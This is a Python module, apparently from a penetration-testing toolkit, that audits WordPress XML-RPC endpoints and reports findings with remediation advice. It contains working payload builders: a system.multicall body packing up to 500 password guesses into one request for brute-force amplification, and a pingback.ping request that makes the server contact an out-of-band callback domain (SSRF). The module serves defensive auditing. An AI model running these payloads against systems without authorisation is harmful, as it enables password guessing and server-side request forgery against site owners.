"""WordPress XML-RPC attack surface — amplification brute force, pingback SSRF."""
from __future__ import annotations
import asyncio
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

XMLRPC_PATH = "/xmlrpc.php"

LIST_METHODS_BODY = """<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""

def _multicall_body(username: str, passwords: list[str]) -> str:
    calls = "".join(
        f"""<value><struct>
  <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
  <member><name>params</name><value><array><data>
    <value><array><data>
      <value><string>{username}</string></value>
      <value><string>{p}</string></value>
    </data></array></value>
  </data></array></value></member>
</struct></value>"""
        for p in passwords[:500]
    )
    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
{calls}
  </data></array></value></param></params>
</methodCall>"""

def _pingback_body(callback_url: str, target_post: str) -> str:
    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>{callback_url}</string></value></param>
    <param><value><string>{target_post}</string></value></param>
  </params>
</methodCall>"""


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    pingback_ssrf: bool = True,
    multicall_check: bool = True,
    oast_domain: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    endpoint = url.rstrip("/") + XMLRPC_PATH
    console.print(f"\n[module]⚡ WordPress XML-RPC Audit[/module] → [target]{endpoint}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=15) as client:
        # — Existence check ——————————————————————————————————————
        try:
            r = await client.post(
                endpoint,
                content=LIST_METHODS_BODY,
                headers={"Content-Type": "text/xml"},
            )
            if r.status_code != 200 or "faultCode" in r.text and "system.listMethods" not in r.text:
                console.print("  XML-RPC: not accessible")
                return {"target": url, "xmlrpc_accessible": False, "findings": []}

            console.print("  [warning]⚠ XML-RPC endpoint accessible[/warning]")

            # Extract method list
            import re
            methods = re.findall(r"<string>([^<]+)</string>", r.text)
            has_multicall = "system.multicall" in methods
            has_pingback = "pingback.ping" in methods
            has_wp_methods = any(m.startswith("wp.") for m in methods)

            finding = {
                "type": "xmlrpc_exposed",
                "methods_count": len(methods),
                "has_multicall": has_multicall,
                "has_pingback": has_pingback,
            }
            findings.append(finding)
            if session:
                await session.add_finding(
                    target=url, module="wordpress.xmlrpc",
                    vuln_type="xmlrpc_exposed",
                    severity="medium", confidence="confirmed",
                    title="WordPress XML-RPC endpoint accessible",
                    description=(
                        f"XML-RPC at {endpoint} is publicly accessible. "
                        f"Available methods: {len(methods)}. "
                        f"system.multicall: {has_multicall}, pingback.ping: {has_pingback}"
                    ),
                    request=f"POST {endpoint} HTTP/1.1",
                    remediation="Disable XML-RPC if not needed. Use plugin 'Disable XML-RPC' or add to .htaccess: <Files xmlrpc.php> deny from all </Files>",
                )

            # — Multicall amplification check ————————————————————
            if multicall_check and has_multicall:
                test_body = _multicall_body("admin", ["wrong_password_xyz123", "another_wrong_456"])
                r2 = await client.post(
                    endpoint,
                    content=test_body,
                    headers={"Content-Type": "text/xml"},
                    timeout=20,
                )
                is_rate_limited = r2.status_code == 429 or "too many" in r2.text.lower()
                print_finding(
                    "XML-RPC multicall brute-force amplification" + (" (rate limited)" if is_rate_limited else " (NOT rate limited)"),
                    "high" if not is_rate_limited else "medium",
                    endpoint,
                )
                if session and not is_rate_limited:
                    await session.add_finding(
                        target=url, module="wordpress.xmlrpc",
                        vuln_type="xmlrpc_bruteforce_amplification",
                        severity="high", confidence="confirmed",
                        title="XML-RPC allows brute-force amplification via system.multicall",
                        description=(
                            "system.multicall allows sending hundreds of login attempts in a single HTTP request, "
                            "completely bypassing per-request rate limiting."
                        ),
                        reproduction=(
                            f"POST {endpoint} with system.multicall body containing "
                            f"500 wp.getUsersBlogs calls with different passwords"
                        ),
                        remediation="Disable XML-RPC or use a plugin that blocks system.multicall.",
                        cvss_score=7.5, cwe="CWE-307",
                    )

            # — Pingback SSRF check ——————————————————————————————
            if pingback_ssrf and has_pingback and oast_domain:
                ssrf_body = _pingback_body(
                    f"http://{oast_domain}/xmlrpc-ssrf",
                    f"{url}/?p=1",
                )
                await client.post(
                    endpoint,
                    content=ssrf_body,
                    headers={"Content-Type": "text/xml"},
                    timeout=10,
                )
                print_finding("XML-RPC pingback SSRF vector (OOB probe sent)", "high", endpoint)
                if session:
                    await session.add_finding(
                        target=url, module="wordpress.xmlrpc",
                        vuln_type="ssrf",
                        severity="high", confidence="likely",
                        title="XML-RPC pingback.ping can be used for SSRF",
                        description=(
                            "The pingback.ping XML-RPC method allows making arbitrary HTTP requests "
                            "from the server to any URL, enabling SSRF attacks."
                        ),
                        reproduction=f"POST {endpoint} with pingback.ping pointing to {oast_domain}",
                        remediation="Disable pingbacks via Settings > Discussion, or disable XML-RPC entirely.",
                        cvss_score=6.5, cwe="CWE-918",
                    )

        except Exception as e:
            log.debug("xmlrpc_error", error=str(e))
            return {"target": url, "xmlrpc_accessible": False, "findings": []}

    console.print(f"  Found {len(findings)} XML-RPC issues")
    return {"target": url, "xmlrpc_accessible": True, "findings": findings}
